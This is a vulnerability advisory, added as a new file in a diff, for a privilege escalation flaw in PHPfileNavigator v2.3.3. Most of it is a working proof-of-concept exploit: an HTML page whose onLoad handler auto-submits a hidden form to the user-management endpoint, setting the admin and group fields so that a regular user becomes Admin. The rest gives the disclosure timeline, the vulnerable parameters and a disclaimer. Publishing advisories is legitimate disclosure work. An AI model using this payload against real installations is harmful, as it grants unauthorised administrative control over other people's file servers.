@@ -1,0 +1,150 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-PHPFILENAVIGATOR0812b.txt
+
+
+
+Vendor:
+=========================
+pfn.sourceforge.net
+
+
+
+Product:
+=====================================================
+PHPfileNavigator v2.3.3 (pfn)
+
+Is state-of-the-art, open source web based application
+to complete manage your files and folders.
+
+
+
+Vulnerability Type:
+=============================
+Privilege Escalation
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+Vulnerability Details:
+=====================
+We can elevate privileges from that of a regular user
+to an Admin level. In order for the attack
+to succeed and escalate privileges to become Admin you need
+know your ID  for the 'id_usuario' field when executing the
+attack.
+
+Tested using xampp-1.7.0
+
+
+Exploit code(s):
+===============
+
+<!DOCTYPE>
+<html>
+<script>
+function pwn(){
+var e=document.getElementById('ELEVATO_DE_PRIVLOS')
+e.submit()
+
+}
+</script>
+<body onLoad="pwn()">
+
+
+<!-- Escalate privs to that of Admin -->
+
+    <form id="ELEVATO_DE_PRIVLOS" action="
+http://localhost/PHPfileNavigator/pfn-2.3.3/xestion/usuarios/gdar.php"
+method="post">
+    <input type="hidden" name="id_usuario" value="5" />
+    <input type="text" id="nome" name="nome" value="b2" class="text"
+tabindex="10" />
+    <input type="text" id="usuario" name="usuario" value="b2" class="text"
+tabindex="20" />
+    <input type="password" id="contrasinal" name="contrasinal"
+value="abc123" class="text" tabindex="30" />
+    <input type="password" id="rep_contrasinal" name="rep_contrasinal"
+value="abc123" class="text" tabindex="40" />
+    <input type="text" id="email" name="email" value="b@b.com" class="text"
+tabindex="50" />
+    <input type="text" id="max_descargas" name="max_descargas" value="0"
+class="text" tabindex="60" />
+    <input type="text" id="actual_descargas" name="actual_descargas"
+value="0" class="text" tabindex="70" />
+    <select id="cambiar_datos" name="cambiar_datos" tabindex="75">
+    <option value="1" >ON</option>
+    <option value="0" selected="selected">OFF</option>
+    </select>
+    <select id="id_grupo" name="id_grupo" tabindex="80">
+    <option value="1" selected="selected">Administrators</option>
+    </select>
+    <select id="admin" name="admin" tabindex="90">
+    <option value="1" selected="selected">ON</option>
+    <option value="0">OFF</option>
+    </select>
+    <select id="estado" name="estado" tabindex="100">
+    <option value="1" selected="selected">ON</option>
+    <option value="0" >OFF</option>
+    </select>
+    <input type="checkbox" id="Fraices_1" name="Fraices[]" value="1"
+ class="checkbox" />
+    </form>
+
+</body>
+</html>
+
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: August 8, 2015
+August 12, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] POST
+
+
+Vulnerable Product:             [+] PHPfileNavigator v2.3.3 (pfn)
+
+
+Vulnerable Parameter(s):        [+] id_grupo, admin, id_usuario
+
+
+Affected Area(s):               [+] Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
